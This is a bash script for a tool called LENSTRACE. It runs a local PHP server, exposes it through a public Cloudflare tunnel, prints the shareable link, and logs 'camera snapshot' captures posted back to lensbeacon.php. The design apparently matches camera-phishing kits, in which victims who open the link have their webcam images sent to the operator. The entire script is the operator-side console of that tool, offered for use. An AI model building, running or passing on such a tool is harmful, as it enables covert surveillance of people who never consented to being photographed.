#!/usr/bin/env bash
set -euo pipefail

###########################################
# LENSTRACE — serve.sh (Snapshot Edition)
###########################################

# ANSI Color Codes
RED=$(tput setaf 1)
GRN=$(tput setaf 2)
CYA=$(tput setaf 6)
YLW=$(tput setaf 3)
BLU=$(tput setaf 4)
MAG=$(tput setaf 5)
WHT=$(tput setaf 7)
RST=$(tput sgr0)
BOLD=$(tput bold)
DIM=$(tput dim)

HOST="127.0.0.1"
PORT="8080"
ROOT="$(cd "$(dirname "$0")" && pwd)"
PHP_LOG="$ROOT/php_silent.log"
TUNNEL_LOG="$ROOT/tunnel_silent.log"
CAPTURE="$ROOT/capture"
CLOUDFLARED="$ROOT/cloudflared"

mkdir -p "$CAPTURE"
touch "$PHP_LOG" "$TUNNEL_LOG"

clear
cat << 'EOF'
EOF
# Replace variables in the ASCII art
echo -e "${MAG}${BOLD}
  ╔══════════════════════════════════════════════════════════════════╗
  ║                                                                  ║
  ║  ██╗                   ████████╗██████╗  █████╗  ██████╗███████╗ ║
  ║  ██║                   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝ ║
  ║  ██║         █████╗       ██║   ██████╔╝███████║██║     █████╗   ║
  ║  ██║         ╚════╝       ██║   ██╔══██╗██╔══██║██║     ██╔══╝   ║
  ║  ███████╗                 ██║   ██║  ██║██║  ██║╚██████╗███████╗ ║
  ║  ╚══════╝                 ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝ ║
  ║                                                                  ║
  ║                 L  E  N  S  T  R  A  C  E                        ║
  ║              Automated Snapshot Telemetry Console                ║
  ║                    by CHRIZ • SKY TECH&CRAFTS                    ║
  ╚══════════════════════════════════════════════════════════════════╝${RST}
"

spinner() {
    local msg="$1"
    local frames=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠇" "⠏")
    local i=0
    while :; do
        printf "\r${BLU}│${RST} %-50s ${MAG}%s${RST}" "$msg" "${frames[i % 9]}"
        i=$((i + 1))
        sleep 0.12
    done
}

flash_snap() {
    local frames=(
        "${MAG}${BOLD}📸 SNAPSHOT PING 📸${RST}"
        "${CYA}${BOLD}📸 SNAPSHOT PING 📸${RST}"
        "${YLW}${BOLD}📸 SNAPSHOT PING 📸${RST}"
    )
    for i in {1..7}; do
        printf "\r%s" "${frames[$((i % 3))]}"
        sleep 0.09
    done
    printf "\r\033[K"
}

# System Checks
if ! command -v php >/dev/null 2>&1; then
  echo -e "${RED}│ [!] PHP is not installed.${RST}"
  exit 1
fi
if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
  echo -e "${RED}│ [!] Neither curl nor wget found (needed for cloudflared).${RST}"
  exit 1
fi

# Start PHP Server
spinner "Starting PHP server on $HOST:$PORT..." &
SP=$!
nohup php -S "$HOST:$PORT" -t "$ROOT" > "$PHP_LOG" 2>&1 &
sleep 1
kill "$SP" >/dev/null 2>&1 || true
printf "\r${GRN}│ [✔] PHP Server Active${RST}\n"

# Download/Check Cloudflared
if [ ! -x "$CLOUDFLARED" ]; then
  spinner "Fetching cloudflared binary..." &
  SP=$!
  if command -v curl >/dev/null 2>&1; then
    curl -sLo "$CLOUDFLARED" \
      https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 || true
  else
    wget -qO "$CLOUDFLARED" \
      https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 || true
  fi
  chmod +x "$CLOUDFLARED" 2>/dev/null || true
  kill "$SP" >/dev/null 2>&1 || true
  printf "\r${GRN}│ [✔] Cloudflared Ready${RST}\n"
else
  echo -e "${GRN}│ [✔] Cloudflared Found${RST}"
fi

# Start Tunnel
spinner "Establishing Cloudflare Tunnel..." &
SP=$!
nohup "$CLOUDFLARED" tunnel --url "http://$HOST:$PORT" --no-autoupdate > "$TUNNEL_LOG" 2>&1 &
sleep 2
kill "$SP" >/dev/null 2>&1 || true
printf "\r${GRN}│ [✔] Tunnel Established${RST}\n"

# Get Public URL
spinner "Resolving public tunnel URL..." &
SP=$!
PUBLIC_URL=""
for _ in {1..60}; do
  PUBLIC_URL=$(grep -Eo "https://[A-Za-z0-9.-]+\.trycloudflare\.com" "$TUNNEL_LOG" | head -n1 || true)
  [ -n "$PUBLIC_URL" ] && break
  sleep 0.5
done
kill "$SP" >/dev/null 2>&1 || true

if [ -z "$PUBLIC_URL" ]; then
  echo -e "${RED}│ [!] Could not acquire public URL. Check $TUNNEL_LOG${RST}"
  exit 1
fi

printf "\r${GRN}│ [✔] Public URL Acquired${RST}\n"

echo -e "
${CYA}${BOLD}┌─────────────────────────────────────────────────────────────┐${RST}
${CYA}${BOLD}│ 🌐 Global LENSTRACE Snapshot Link                           │${RST}
${CYA}${BOLD}├─────────────────────────────────────────────────────────────┤${RST}
${YLW}${BOLD}│ $PUBLIC_URL${RST}
${CYA}${BOLD}└─────────────────────────────────────────────────────────────┘${RST}

${GRN}📡 Monitoring for camera snapshot events...${RST}
${DIM}Press Ctrl+C to stop${RST}
"

LAST_SIZE=0

while true; do
  CUR_SIZE=$(wc -c < "$PHP_LOG" 2>/dev/null || echo 0)
  if (( CUR_SIZE > LAST_SIZE )); then
    NEW=$(tail -c +$((LAST_SIZE + 1)) "$PHP_LOG" 2>/dev/null || true)
    CLEAN=$(echo "$NEW" | tr -d '\000' | sed 's/^\[[^]]*\] //')
    if echo "$CLEAN" | grep -q "LENSTRACE — SNAPSHOT CAPTURED\|POST /lensbeacon.php"; then
      flash_snap
      echo -e "${MAG}${BOLD}│ 📸 Snapshot Received${RST} $(date '+%H:%M:%S')"
      # Log to capture file
      echo "$(date '+%Y-%m-%d %H:%M:%S') - $CLEAN" >> "$CAPTURE/snapshots.log" 2>/dev/null || true
    fi
    LAST_SIZE=$CUR_SIZE
  fi
  sleep 0.15
done